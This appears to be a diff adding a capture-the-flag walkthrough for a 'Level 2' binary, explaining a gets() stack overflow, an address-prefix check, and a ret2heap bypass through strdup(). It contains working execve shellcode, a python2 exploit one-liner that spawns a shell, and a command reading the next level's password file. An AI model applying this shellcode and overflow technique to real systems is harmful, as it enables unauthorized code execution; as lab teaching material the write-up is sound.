@@ -1,0 +1,190 @@
+# Level 2 Walkthrough
+
+## Goal
+
+Exploit a stack buffer overflow in `p()` while bypassing an anti-exploit check that blocks stack and libc addresses. The solution is **ret2heap** — place shellcode in the heap via `strdup()` and jump there.
+
+---
+
+## 1. Analyze the Binary
+
+```bash
+gdb ./level2
+(gdb) info functions
+(gdb) disas main
+(gdb) disas p
+```
+
+The real work happens inside `p()`. The decompiled logic looks like:
+
+```c
+void p() {
+    char buffer[64];
+    fflush(stdout);
+    gets(buffer);                              // ← vulnerable
+
+    int ret = __builtin_return_address(0);    // reads return address off the stack
+    if ((ret & 0xb0000000) == 0xb0000000) {  // anti-exploit check
+        printf("(%p)\n", ret);
+        _exit(1);
+    }
+
+    puts(buffer);
+    strdup(buffer);                            // ← copies buffer to heap
+}
+```
+
+---
+
+## 2. The Vulnerability
+
+`gets()` has no bounds checking. The buffer is 64 bytes but `gets()` will write however much you give it, overflowing into:
+
+```
+Higher Addresses
+┌──────────────────┐
+│  Return Address  │  ← we overwrite this
+├──────────────────┤
+│  Saved EBP       │  ← corrupted
+├──────────────────┤
+│  [padding]       │
+├──────────────────┤
+│  buffer[64]      │  ← gets() starts writing here
+└──────────────────┘
+Lower Addresses
+```
+
+Through GDB analysis, the return address is reached after **80 bytes** (64 buffer + 12 alignment + 4 saved EBP).
+
+---
+
+## 3. The Anti-Exploit Check
+
+```c
+int ret = __builtin_return_address(0);
+if ((ret & 0xb0000000) == 0xb0000000) {
+    _exit(1);
+}
+```
+
+This reads the return address **from the stack** (which you've already overwritten), then checks the high nibble.
+
+It blocks:
+
+| Address range | What it is | Blocked? |
+|---|---|---|
+| `0xbf......` | Stack memory | ✅ blocked |
+| `0xb7......` | libc memory | ✅ blocked |
+| `0x0804....` | Heap / code segment | ❌ not blocked |
+
+This kills two classic techniques:
+- **ret2stack** — shellcode sitting in the buffer → address starts with `0xbf` → blocked
+- **ret2libc** — jump to `system()` in libc → address starts with `0xb7` → blocked
+
+---
+
+## 4. The Solution — ret2heap
+
+`strdup(buffer)` is called **after** the check. It:
+1. `malloc()`s a new chunk on the heap
+2. Copies the entire contents of `buffer` into it
+3. Returns the heap pointer — always lands at `0x0804a008` on this VM
+
+The heap is **RWE** (readable, writable, executable) on this binary. That means bytes you put there can be executed as code.
+
+**The plan:**
+- Put shellcode at the **start** of your input
+- `strdup()` copies it to `0x0804a008`
+- Overwrite the return address with `0x0804a008`
+- `p()` returns → RET fires → CPU jumps to heap → shellcode runs
+
+---
+
+## 5. The Shellcode
+
+```
+\x6a\x0b    push 0x0b
+\x58        pop eax
+\x99        cdq
+\x52        push edx
+\x68\x2f\x2f\x73\x68    push "//sh"
+\x68\x2f\x62\x69\x6e    push "/bin"
+\x89\xe3    mov ebx, esp
+\x31\xc9    xor ecx, ecx
+\xcd\x80    int 0x80
+```
+
+This is a 21-byte x86 Linux `execve("/bin//sh", NULL, NULL)` shellcode. It calls syscall 11 directly via `int 0x80`, bypassing libc entirely.
+
+---
+
+## 6. Payload Layout
+
+```
+[21 bytes shellcode][59 bytes 'A'][0x0804a008]
+└─────────────────────────────────┘└──────────┘
+          80 bytes                  return addr
+      (fills buffer + EBP)
+```
+
+Total input: **84 bytes**
+
+---
+
+## 7. Exploit
+
+```bash
+(python2 -c 'import struct; print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + struct.pack("<I", 0x0804a008)'; cat) | ./level2
+```
+
+---
+
+## 8. Execution Flow
+
+```
+Input arrives
+     │
+gets() writes to buffer:
+  [shellcode 21B][AAAA...59B][0x0804a008]
+     │
+Anti-exploit check reads return address = 0x0804a008
+0x0804a008 & 0xb0000000 = 0x00000000 ≠ 0xb0000000
+     │ CHECK PASSED
+puts(buffer) prints our payload
+     │
+strdup(buffer) → mallocs heap chunk → copies payload to 0x0804a008
+     │
+p() executes LEAVE + RET
+     │
+RET pops 0x0804a008 into EIP
+     │
+CPU jumps to 0x0804a008 (heap)
+     │
+Executes our shellcode
+     │
+execve("/bin//sh", NULL, NULL)
+     │
+Shell as level3
+```
+
+---
+
+## 9. Get the Password
+
+```bash
+cat /home/user/level3/.pass
+```
+
+---
+
+## Key Concepts
+
+| Concept | Meaning |
+|---|---|
+| **ret2heap** | Place shellcode on the heap and jump to it |
+| **Anti-exploit check** | Reads return address to block `0xb` prefix addresses |
+| **`strdup()`** | Copies input to a predictable heap address |
+| **Heap RWE** | Heap is executable on this binary — bytes can run as code |
+| **Shellcode** | Raw machine code bytes that spawn a shell via syscall |
+| **`int 0x80`** | x86 Linux syscall gate — no libc needed |
+| **`struct.pack("<I", addr)`** | Packs address as 4 bytes little-endian |
